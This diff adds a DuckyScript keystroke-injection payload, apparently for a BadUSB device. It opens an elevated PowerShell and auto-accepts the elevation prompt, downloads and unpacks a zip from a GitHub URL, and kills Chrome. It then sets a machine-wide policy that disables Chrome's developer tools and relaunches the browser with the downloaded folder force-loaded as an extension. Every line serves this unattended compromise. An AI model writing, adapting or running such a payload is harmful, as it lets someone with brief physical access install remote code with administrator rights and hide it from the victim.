@@ -1,0 +1,25 @@
+GUI r
+DELAY 100
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 1000
+STRING $url = "https://github.com/Theriolu/nicolas-script/raw/main/ncage.zip"; $destination = [System.IO.Path]::Combine($env:USERPROFILE, "Documents\ncage.zip"); Invoke-WebRequest -Uri $url -OutFile $destination; $extractPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents\ncage"); if (Test-Path $extractPath) { Remove-Item -Recurse -Force $extractPath }; New-Item -ItemType Directory -Path $extractPath; Expand-Archive -Path $destination -DestinationPath $extractPath
+ENTER
+DELAY 5000
+STRING Stop-Process -Name chrome -Force
+ENTER
+DELAY 1000
+STRING if (-not (Test-Path "HKLM:\Software\Policies\Google\Chrome")) { New-Item -Path "HKLM:\Software\Policies\Google\Chrome" -Force | Out-Null }; Set-ItemProperty -Path "HKLM:\Software\Policies\Google\Chrome" -Name "DeveloperToolsAvailability" -Value 2
+ENTER
+DELAY 500
+STRING Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" "--load-extension=$extractPath"
+ENTER
+DELAY 3000
+ALT TAB
+DELAY 500
+STRING exit
+ENTER
